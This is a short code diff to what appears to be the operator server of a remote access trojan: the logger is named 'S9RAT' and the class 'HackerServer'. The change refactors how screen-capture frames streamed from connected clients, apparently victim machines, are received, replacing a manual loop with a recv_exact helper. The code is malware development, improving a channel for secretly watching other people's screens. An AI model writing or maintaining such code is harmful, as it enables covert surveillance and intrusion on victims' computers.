@@ -4,7 +4,7 @@ import threading
 import time
 import logging
 import os
-from .protocol import pack_message, recv_message, DEFAULT_PORT
+from .protocol import pack_message, recv_message, recv_exact, DEFAULT_PORT
 
 logger = logging.getLogger("S9RAT")
 
@@ -134,14 +134,10 @@ class HackerServer:
                 if msg_type == "SCREEN_FRAME":
                     frame_size = data.get("size", 0)
                     if frame_size > 0:
-                        frame_data = b""
-                        remaining = frame_size
-                        while remaining > 0:
-                            chunk = sock.recv(min(remaining, 65536))
-                            if not chunk:
-                                break
-                            frame_data += chunk
-                            remaining -= len(chunk)
+                        try:
+                            frame_data = recv_exact(sock, frame_size)
+                        except ConnectionError:
+                            break
                         if self._on_screen_frame:
                             self._on_screen_frame(client_id, frame_data)
 
